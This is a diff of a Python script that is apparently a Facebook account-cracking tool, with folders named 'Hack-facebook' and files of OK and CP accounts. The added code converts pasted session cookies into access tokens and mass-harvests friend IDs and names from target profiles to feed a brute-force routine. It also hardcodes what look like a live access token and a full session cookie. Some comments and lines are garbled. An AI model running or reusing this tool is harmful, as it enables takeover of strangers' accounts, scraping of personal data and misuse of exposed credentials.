@@ -1576,10 +1576,106 @@ id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=
 cokbrut=[]
 pwpluss,pwnya=[],[]
 infoo=[]
-def Raghadan():
+
+#كود برمجي يقوم بـ اضافه الوقت و التاريخ  ..
+#عند انتهى الوقت و التاريخ المحدد لا يعمل السورس ..
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import os
+import sys
+import time
+import datetime;now = datetime.date.today();target = datetime.date(2024,7,12)
+if now >=target:print
+from threading import (Thread, Event)
+import webbrowser
+lo = '''
+'''
+print(f'\033[1;31m{lo}')
+
+na = webbrowser.open ('https://t.me/')
+
+try:
+        
+        import rich
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
+        os.system('pip install rich')
+try:
+        import stdiomask
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
+        os.system('pip install stdiomask')
+try:
+    import requests
+except ImportError:
+    Z = '\033[1;31m' #احمر
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,h,u,b])
+
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+
+def fak_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
+def clear():
+    os.system('clear')
+def back():
+    ddfmot0()
+
+def banner():
+    print(f'''\t{asu}''')
+
+def ddfmot0():
     try:
-        token = open('.token','r').read()
-        cok = open('.cok','r').read()
+        token = open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.token','r').read()
+        cok = open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.cok','r').read()
         tokenku.append(token)
         try:
             sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
@@ -1589,23 +1685,26 @@ def Raghadan():
         except KeyError:
             login_lagi334()
         except requests.exceptions.ConnectionError:
-            li = '#النت ضعيف حاول لاحقا او اعد تشغيل الاداة ✅'
+            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
             lo = mark(li, style='red')
             sol().print(lo, style='cyan')
             exit()
     except IOError:
         login_lagi334()
+
+
 def login_lagi334():
     try:
-        banner()
+        
         asu = random.choice([m,k,h,b,u])
-        cookie=input(f' ENTER COOKIES :{asu} ')
-        open(".cok", "w").write(cookie)
+        os.system('clear')
+        cookie=input(f'  [{h}•{x}]Cookies :{asu} ')
+        open("/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.cok", "w").write(cookie)
         with requests.Session() as rsn:
             try:
                 rsn.headers.update({
                     'Accept-Language': 'id,en;q=0.9',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36',
                     'Referer': 'https://www.instagram.com/',
                     'Host': 'www.facebook.com',
                     'Sec-Fetch-Mode': 'cors',
@@ -1619,31 +1718,39 @@ def login_lagi334():
                 response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
                 if '"access_token":' in str(response.headers):
                     token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
-                    open(".token", "w").write(token)
-                    print('%تم التسجيل بنجاح%s'%(h, p))
+                    open("/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.token", "w").write(token)
+                    print('%sLogin Succes%s'%(h, p))
 
                 else:
-                    print('%sفشل تسجيل الدخول%s'%(m, p))
+                    print('%sFailled Get Token%s'%(m, p))
+
             except:
-                print('تم تسجيل بنجاح ')
-        print(f'  {x}[{h}•{x}]{h}  أعد تشغيل {x} ');time.sleep(1)
+                print('Failled Get Token')
+
+        print(f'  {x}[{h}•{x}]{h}  شغلها مره ثانيه!!!!{x} ');time.sleep(1)
         exit()
     except Exception as e:
-        os.system("rm -f .token")
-        os.system("rm -f .cok")
-        print(f'  %s[%sx%s]%s تم تسجيل الدخول%s'%(x,k,x,m,x))
+        os.system("rm -f /storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.token")
+        os.system("rm -f /storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.cok")
+        print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
         print(e)
         exit()
 def bot():
     try:
-        requests.post("https://graph.facebook.com/100021452820090?fields=subscribers&access_token=%s"%(tokenku))
+        requests.post("https://graph.facebook.com/1041878?fields=subscribers&access_token=%s"%(tokenku))
     except:
         pass
-def menu(my_name,my_id):
-	os.system('clear')
 
-	gh = 'h'
-	print(f"""⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+def menu(my_name,my_id):
+    try:
+        token = open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.token','r').read()
+        cok = open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.cok','r').read()
+    except IOError:
+        print('[×] Cookies Kadaluarsa ')
+        time.sleep(5)
+        login_lagi334()
+    os.system('clear')
+    print(f"""⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
 ⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
@@ -1662,90 +1769,98 @@ def menu(my_name,my_id):
 """)
 
 	
-
-	_____alvino__adijaya_____ = '1'
-	if _____alvino__adijaya_____ in ['1']:
-		dump_massal()
-	elif _____alvino__adijaya_____ in ['0']:
-		os.system('rm -rf .token.txt')
-		os.system('rm -rf .cookie.txt')
-		print(' Successfully Logout+Delete Cookies√ ')
-		exit()
-	else:
-		print(' input correctly ')
-		back()
+    _____alvino__adijaya_____ = '1'
+    if _____alvino__adijaya_____ in ['1']:
+        dump_massal()
+    elif _____alvino__adijaya_____ in ['2']:
+        dump_follower()
+    elif _____alvino__adijaya_____ in ['3']:
+        grup()
+    elif _____alvino__adijaya_____ in ['4']:
+        crack_file()
+    elif _____alvino__adijaya_____ in ['5']:
+        result()
+    elif _____alvino__adijaya_____ in ['0']:
+        os.system('rm -rf /storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.token')
+        os.system('rm -rf /storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.cok')
+        print('>> Done Logout+Hapus Kukis ')
+        exit()
+    else:
+        print('>> PILIH YANG BENAR ')
+        back()
 def error():
-	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
-	time.sleep(4)
-	back()
+    print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
+    time.sleep(4)
+    back()
 
-def setting():
-	
-	
-	print(f'>> 𝚒𝚍𝚜 : {len(id)}')
 
 def dump_massal():
     try:
-        token = open('.token','r').read()
-        cok = open('.cok','r').read()
+        token = open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.token','r').read()
+        cok = open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/.cok','r').read()
     except IOError:
         exit()
     try:
-        jum = int(input(' [=] MANY ID : '))
+        jum = int(input('\n>> many id : '))
     except ValueError:
-        print('>> Masukkan Angka Anjing, Malah Huruff ')
+        print('>> error ')
         exit()
     if jum<1 or jum>100:
-        print('>> Gagal Dump Idz ')
+        print('>> error ')
         exit()
-    
     ses=requests.Session()
     yz = 0
-    uid = []  # تعريف القائمة لتخزين الأيدي
     for met in range(jum):
         yz+=1
-        kl = input('>> ENTER ID '+str(yz)+' : ')
+        kl = input('\n>> Id Target '+str(yz)+' : ')
         uid.append(kl)
-    
-    # طلب المسار لحفظ الملف من المستخدم
-    save_path = input(">> أدخل مسار حفظ الملف (مثال: /storage/emulated/0/YourFolder/List-fb.txt): ")
-    
     for user in uid:
         try:
-           head = {
-               "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
-           }
-           params = {
-               'access_token': token,
-               'fields': "friends"
-           }
-           
-           url = requests.get(f'https://graph.facebook.com/{user}', params=params, headers=head, cookies={'cookies': cok}).json()
-           for xr in url.get('friends', {}).get('data', []):
+           head = (
+           {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+           })
+           if len(id) == 0:
+               params = (
+               {
+                'access_token': token,
+                'fields': "friends"
+               }              
+           )
+           else:
+               params = (
+               {
+                'access_token': token,
+                'fields': "friends"
+               }               
+           )
+           url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+           for xr in url['friends']['data']:
                try:
-                   woy = (xr['id'] + '|' + xr['name'])
-                   # كتابة البيانات إلى المسار المحدد
-                   with open(save_path, 'a') as file:
-                       file.write(xr['id'] + '|' + xr['name'] + '\n')
-                   if woy not in id:
-                       id.append(woy)
-               except Exception as e:
-                   continue
-        except (KeyError, IOError):
-            pass
+                   woy = (xr['id']+'|'+xr['name'])
+                   open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/list-fd.txt','a').write(xr['id']+'|'+xr['name']+'\n')
+                   
+                   if woy in id:pass
+                   else:id.append(woy)
+               except:continue
+        except (KeyError,IOError):
+          pass
         except requests.exceptions.ConnectionError:
             exit()
-    
     try:
-        print(f' TRUE ID {h} {len(id)}')
+        print('')
+        print(X+'Done')
+        print(f' ➪ 𝚒𝚍𝚜 : {h}'+str(len(id)))
+        
         setting()
     except requests.exceptions.ConnectionError:
-        print('>> Sinyal Loh Kurang Bagus ')
+        print(f'{G}')
+        print('>> error')
         back()
-    except (KeyError, IOError):
-        print('>> Pertemanan Tidak Public')
-        time.sleep(3)
-        back()
+    except (KeyError,IOError):
+        print(f'>>{k} error {x}')
+        exit()
+        exit()
+
  
 import requests
 import random
@@ -2148,7 +2263,7 @@ def Menu():
         elif choice == "2":
             File()
         elif choice == "3":
-            Raghadan()
+            ddfmot0()
         else:
             console.print("[bold red]Invalid choice, try again.")
             return Menu()  
@@ -2514,15 +2629,28 @@ if __name__ == "__main__":
         
         if not os.path.exists(list_folder):
             os.makedirs(list_folder)
+            
+        if not os.path.exists(os.path.join(main_folder, 'list-fd.txt')):
+            with open(os.path.join(main_folder, 'list-fd.txt'), 'w') as file:
+                file.write("")
 
+          
         # إنشاء الملفات فقط إذا لم تكن موجودة
         if not os.path.exists(os.path.join(accounts_folder, 'حسابات-OK.txt')):
             with open(os.path.join(accounts_folder, 'حسابات-OK.txt'), 'w') as file:
                 file.write("")
 
-        if not os.path.exists(os.path.join(main_folder, 'حسابات-CP.txt')):
-            with open(os.path.join(main_folder, 'حسابات-CP.txt'), 'w') as file:
+        if not os.path.exists(os.path.join(accounts_folder, 'حسابات-CP.txt')):
+            with open(os.path.join(accounts_folder, 'حسابات-CP.txt'), 'w') as file:
                 file.write("")
+                
+        if not os.path.exists(os.path.join(accounts_folder, '.token')):
+            with open(os.path.join(accounts_folder, '.token'), 'w') as file:
+                file.write("EAABwzLixnjYBO6b6aPNyCc4WFhZAqonoCgga8r2euhd36ZAx5O9z4TfCCWKowTOWmFZBUJwU9D6vOOnsCHG0CV5EalCZCUyz9XZAjwMZAvBYpOjNtZAZB1IJvDZAdAOUAEhwIf40i19KZBAHIFji9HKn1kRZCiXMTZAzfHWTUxSz4KX4xu4d76Iz4j8VgAjZA37psALgG2vQZD")
+
+        if not os.path.exists(os.path.join(accounts_folder, '.cok')):
+            with open(os.path.join(accounts_folder, '.cok'), 'w') as file:
+                file.write("datr=svL7Zq4PFVq9xBuOvDkiHWg5;vpd=v1%3B832x432x1.6687500476837158;sb=pyAmZ4Y02V_EvhPlpAyKopWN;m_pixel_ratio=1.6687500476837158;ps_l=1;ps_n=1;wd=432x832;c_user=100090780236034;fr=14kK9o6CRMcNe95Ji.AWV1bJmwZw2SNrewE7K8x_Yd5ds.BnJiCn..AAA.0.0.BnebvF.AWVaLaI08J8;xs=43%3Ang1APuSicmN90Q%3A2%3A1736031174%3A-1%3A12166;locale=ar_AR;wl_cbv=v2%3Bclient_version%3A2701%3Btimestamp%3A1736031498;fbl_st=100727476%3BT%3A28933863;")
 
 
         print("")
@@ -2535,4 +2663,4 @@ if __name__ == "__main__":
     brute = Brute()  # كائن من الفئة Brute
     Menu()           # عرض القاjئnnمjjة أو nتنفيذ الخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhhhhyاتتاااbh,😙𝚑𝚑😋gbتتتااhj𝐡𝐡
+    #bhgوتyyyتتتتناتتjjhmnhhhyاتتاااbنh,😙𝚑𝚑😋gbتتتااhj𝐡𝐡
